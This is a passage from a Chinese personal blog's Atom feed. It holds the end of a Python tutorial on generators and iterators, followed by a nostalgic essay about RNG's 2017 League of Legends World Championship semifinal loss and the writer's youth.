class="line">&gt;&gt;&gt;<span class="keyword">for</span> n <span class="keyword">in</span> fib(<span class="number">6</span>):</div><div class="line"><span class="meta">... </span>    print(n)</div><div class="line">...</div></pre></td></tr></table></figure></p><p>但是用for循环调用generator时，发现拿不到generator的return语句的返回值。如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;while True:</div><div class="line">...     try:</div><div class="line">...         x = next(g)</div><div class="line">...         print(&apos;g:&apos;, x)</div><div class="line">...     except StopIteration as e:</div><div class="line">...         print(&apos;Generator return value:&apos;, e.value)</div><div class="line">...         break</div></pre></td></tr></table></figure></p><p>请注意区分普通函数和generator函数，普通函数调用直接返回结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;r = abs(<span class="number">6</span>)</div><div class="line">&gt;&gt;&gt;r</div><div class="line"><span class="number">6</span></div></pre></td></tr></table></figure></p><p>generator函数的“调用”实际返回一个generator对象：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;g = fib(<span class="number">6</span>)</div><div class="line">&gt;&gt;&gt;g</div><div class="line">&lt;generator object fib at <span class="number">0x1022ef948</span>&gt;</div></pre></td></tr></table></figure></p><p>练习输出杨辉三角  见yanghuireiangle</p><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>可作用于for的数据类型，一类为集合数据类型，一类为generator<br>统称为可迭代对象：Iterable 用 isinstance ()判断<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</div><div class="line">&gt;&gt;&gt;isinstance((x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)), Iterator)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance([], Iterator)</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(&#123;&#125;, Iterator)</div><div class="line"><span class="keyword">False</span></div><div class="line">&gt;&gt;&gt;isinstance(<span class="string">'abc'</span>, Iterator)</div><div class="line"><span class="keyword">False</span></div><div class="line">把list、dict、str等Iterable变成Iterator可以使用iter()函数：</div><div class="line">&gt;&gt;&gt;isinstance(iter([]), Iterator)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance(iter(<span class="string">'abc'</span>), Iterator)</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p><p>Iterator对象表示一个数据流，不能提起知道序列的长度，其计算为惰性的，只有在需要下一个返回值的时候才会计算</p><p>可作用于for的对象都是Iterable类型<br>可作用于next()的都是Iterator类型<br>for循环本质上就是通过不断调用next()函数实现的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]:</div><div class="line"><span class="keyword">pass</span></div></pre></td></tr></table></figure></p><p>实际上完全等价于：<br>首先获得Iterator对象:<br>    it = iter([1, 2, 3, 4, 5])<br>循环:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="comment"># 获得下一个值:</span></div><div class="line">x = next(it)</div><div class="line"><span class="keyword">except</span> StopIteration:</div><div class="line"><span class="comment"># 遇到StopIteration就退出循环</span></div><div class="line"><span class="keyword">break</span></div></pre></td></tr></table></figure></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>凡是可作用于for循环的对象都是Iterable类型；<br>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;切片&quot;&gt;&lt;a href=&quot;#切片&quot; class=&quot;headerlink&quot; title=&quot;切片&quot;&gt;&lt;/a&gt;切片&lt;/h1&gt;&lt;p&gt;取list或者tuple的部分元素&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纪念我逝去的青春</title>
    <link href="https://www.twosmi1e.com/2017/10/28/%E7%BA%AA%E5%BF%B5%E6%88%91%E9%80%9D%E5%8E%BB%E7%9A%84%E9%9D%92%E6%98%A5/"/>
    <id>https://www.twosmi1e.com/2017/10/28/纪念我逝去的青春/</id>
    <published>2017-10-28T15:14:35.000Z</published>
    <updated>2018-08-02T16:24:10.402Z</updated>
    
    <content type="html"><![CDATA[<p>  &nbsp;&nbsp;当第五局开场Sliver&nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。<br>  &nbsp;&nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来两个人死在一起的时候，真的心中一凉，原来真的 青春不一定会圆满啊。</p><p>  &nbsp;&nbsp;这个BO5，看到了小狗的vn，看到了letme的纳尔，看到了虎九万的飞机，看到了香锅两把MVP的表现，真的足够了，唯一遗憾的就是没能打败SKT<br>晋级总决赛吧。</p><p>  &nbsp;&nbsp;从S2到S7，五年了，初中时刚刚知晓英雄联盟，和同学一起去黑网吧打人机还打的津津有味。高中那时进一个网吧清一色的英雄联盟，中午觉都不睡去打一把就是为了拿首胜买英雄，逃晚自习逃课和同学一起出去双排，最开心的事情就是和一群兄弟一起去网吧五黑，那时的微笑，草莓，若风，那时的WE，都是回忆啊。今年可以说是LPL最有希望的一年，是RNG最有希望的一年，在家门口打比赛，所有玩过英雄联盟的人都在关注着，为LPL加油，这也是ADC强势的版本，小狗状态也很好，天时地利人和，真的希望RNG全华班能夺冠，买上一个冠军皮肤，然后打上两把告别召唤师峡谷。当初一起玩LOL的人都已经陆续离开了，守望先锋，绝地求生，或是不玩游戏了，毕竟都已经长大了，据说S8还要改符文系统，我已经没有那么多精力再去适应新版本再去玩游戏了吧，所以可能S7就是最后一次追这赛事了吧，和LPL一起逝去的，是那些回忆那些青春啊！<br>  &nbsp;&nbsp;ROYAL NERVER GIVE UP！今天RNG是站着死的，不想喷任何人，也不想他们被喷，在我心中香锅就是世界第一打野，世界上只有一个VN叫uzi，谁说LPL只有蓝领型上单我们有letme，ming的凤女洛都曾带来精彩的表演，还有单杀faker的虎将军，你们，真的已经很棒了。<br>  &nbsp;&nbsp;曾在比赛之前想，如果S7LPL夺冠了，会带来什么？英雄联盟又能多火几年。但这对于我来说，对于我们这些从S1，S2开始的老玩家来说，这是一次青春的完美谢幕，为我那曾经逃课上网的网瘾少年的时光，画上一个圆满的句号。可是不如意事常八九，不可能总是事事圆满。<br>  &nbsp;&nbsp;传奇还在继续，Legend&nbsp;never&nbsp;die，希望LPL不要放弃</p><p>  &nbsp;&nbsp;今夜再矫情一次，再中二一次，再难过地哭一次，为与胜利失之交臂的RNG，也为我逝去的青春。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  &amp;nbsp;&amp;nbsp;当第五局开场Sliver&amp;nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。&lt;br&gt;  &amp;nbsp;&amp;nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://www.twosmi1e.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
